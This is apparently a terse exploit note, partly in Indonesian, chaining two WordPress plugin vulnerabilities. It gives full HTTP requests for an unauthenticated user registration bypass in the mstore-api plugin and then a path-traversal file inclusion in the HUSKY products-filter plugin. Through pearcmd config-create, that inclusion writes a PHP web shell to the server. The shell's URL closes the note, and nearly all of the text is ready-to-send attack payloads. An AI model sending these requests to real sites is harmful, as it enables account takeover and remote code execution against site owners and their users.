# TLDR;

mstore-api -> registration bypass (https://patchstack.com/database/vulnerability/mstore-api/wordpress-mstore-api-create-native-android-ios-apps-on-the-cloud-plugin-4-15-3-unauthorized-user-registration-vulnerability)

Full request:
```http
POST /wp-json/api/flutter_user/register HTTP/1.1
Host: target
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 130


{"username":"begula", "email":"begula@mail.com", "user_login":"begula", "user_pass":"begula123", "user_email":"begula@mail.com"}
```

dengan creds subscriber, bisa exploit vuln berikut (https://patchstack.com/database/vulnerability/woocommerce-products-filter/wordpress-husky-plugin-1-3-5-2-remote-code-execution-rce-vulnerability)

Manfaatin https://book.hacktricks.xyz/pentesting-web/file-inclusion#via-pearcmd.php--url-args dan https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp

Full request:
```http
POST /wp-admin/admin-ajax.php?+config-create+/&/<?system($_GET[0])?>+/var/www/html/beluga2.php HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/wp-admin/admin.php?page=ct-crafthemes-demo-import&ct_notice=dismiss-get-started
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 93
Origin: http://localhost
Connection: close
Cookie: redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

action=woof_sd_get_options&type=../../../../../../../../../../../../usr/local/lib/php/peclcmd
```

bisa akses shell di http://target/beluga2.php